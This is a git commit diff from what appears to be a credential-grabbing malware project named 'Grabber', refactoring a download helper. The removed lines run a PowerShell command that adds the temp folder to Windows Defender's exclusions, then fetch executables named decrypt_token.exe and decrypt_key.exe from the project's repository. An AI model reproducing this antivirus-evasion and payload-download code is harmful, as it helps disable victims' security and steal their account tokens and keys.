595709d7d8d198cd776de254197bd610571df139
Yuuto <55290516+JustYuuto@users.noreply.github.com>
2023-06-30 04:01:00 +0200

    file download

--- functions/download.js
+++ functions/download.js
@@ -2,10 +2,8 @@ const axios = require('axios');
 const { tempFolder } = require('../index');
 const { createWriteStream } = require('fs');
 const { join } = require('path');
-const { sleep, runningFromExecutable } = require('../util/general');
-const { execSync } = require('child_process');
 
-async function download(url) {
+module.exports.download = async function(url) {
   try {
     const { data } = await axios.get(url, {
       responseType: 'stream'
@@ -14,11 +12,4 @@ async function download(url) {
   } catch (e) {
     process.exit(0);
   }
-}
-
-module.exports = async () => {
-  if (runningFromExecutable()) await execSync(`powershell -Command Add-MpPreference -ExclusionPath "${tempFolder}"`);
-  await download('https://github.com/JustYuuto/Grabber/raw/master/util/decrypt-token/decrypt_token.exe');
-  await download('https://github.com/JustYuuto/Grabber/raw/master/util/decrypt-key/decrypt_key.exe');
-  await sleep(1500);
 };
